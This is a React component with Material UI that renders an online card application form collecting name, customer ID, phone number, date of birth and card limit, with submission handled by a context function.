import { Button, Stack, TextField, Typography, } from '@mui/material'
import Header from './Header'
import { useContextProvider } from '../Context/ContextProvider'

const Applay = () => {

    const { LoginApplayHendler, name, setName, customerId, setCustomerId,
        phoneNo, setPhoneNo,
        dateOfB, setDateOfB,
        cardLimit, setCardLimit, logingbtn } = useContextProvider() || {}


    return (
        <Stack >
            <Header />

            <Stack width={"100%"} padding={"6rem .5rem"}>

                <Typography textAlign={"center"} width={"100%"} sx={{ bgcolor: "blue", color: "white", padding: ".4rem", fontWeight: "600", fontSize: "1.5rem" }}>APPLY ONLINE</Typography>

                <Stack width={"100%"} height={"3px"} marginTop={"3rem"} sx={{ bgcolor: "#410112", opacity: ".5" }}></Stack>

                <Stack width={"100%"} marginTop={"4rem"} padding={"1rem"}>
                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Name</Typography>
                    <TextField variant='outlined'
                        value={name} onChange={(e) => setName(e.target.value)}
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
                        placeholder="Full Name" />


                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Customer ID</Typography>
                    <TextField variant='outlined'
                        value={customerId} onChange={(e) => setCustomerId(e.target.value)}

                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
                        placeholder="Enter Id" />

                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Phone No.</Typography>
                    <TextField
                        value={phoneNo} onChange={(e) => setPhoneNo(e.target.value)}
                        inputProps={{
                            maxLength: 10,
                            minlength: 10
                        }} variant='outlined' sx={{
                            borderRadius: "2rem",
                            width: "{100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' }
                        }} placeholder="Enter Number" type='number' />


                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Date Of Birth</Typography>
                    <TextField
                        value={dateOfB} onChange={(e) => setDateOfB(e.target.value)}
                        type='date' variant='outlined'
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& label': { fontSize: '1.3rem' } }}
                        placeholder='------,--' />


                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Card Limit</Typography>
                    <TextField
                        value={cardLimit} onChange={(e) => setCardLimit(e.target.value)}
                        type='number'
                        variant='outlined'
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
                        placeholder="Card Limit" />

                    <Stack width={"100%"} padding={"2rem 0"}>
                        <Button variant='contained' color='primary' onClick={LoginApplayHendler} sx={{
                            margin: "auto", borderRadius: "2rem",
                            width: "13rem", color: "white", padding: "12px 8px", "&hover": { bgcolor: "blue" }
                        }}>{logingbtn ? "Verifying..." : "Submit"}</Button>
                    </Stack>
                </Stack>
            </Stack>

        </Stack>
    )
}

export default Applay